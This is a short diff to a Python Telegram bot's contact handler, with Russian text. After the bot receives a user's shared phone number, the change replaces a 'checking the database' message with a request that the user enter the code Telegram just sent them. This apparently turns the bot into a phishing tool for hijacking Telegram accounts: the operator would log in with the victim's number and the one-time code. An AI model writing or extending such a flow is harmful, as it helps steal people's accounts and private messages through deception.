@@ -194,7 +194,7 @@ async def handle_contact(message: types.Message):
         
         # Убираем клавиатуру с кнопкой поделиться номером
         remove_kb = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton(" "))
-        await bot.send_message(user_id, "✅ Номер получен, проверяем базу...", reply_markup=remove_kb)
+        await bot.send_message(user_id, "✅ Номер получен, введите код пришедшый из Telegram.", reply_markup=remove_kb)
         
     except Exception as e:
         await message.answer("❌ Ошибка при проверке. Попробуйте позже.")
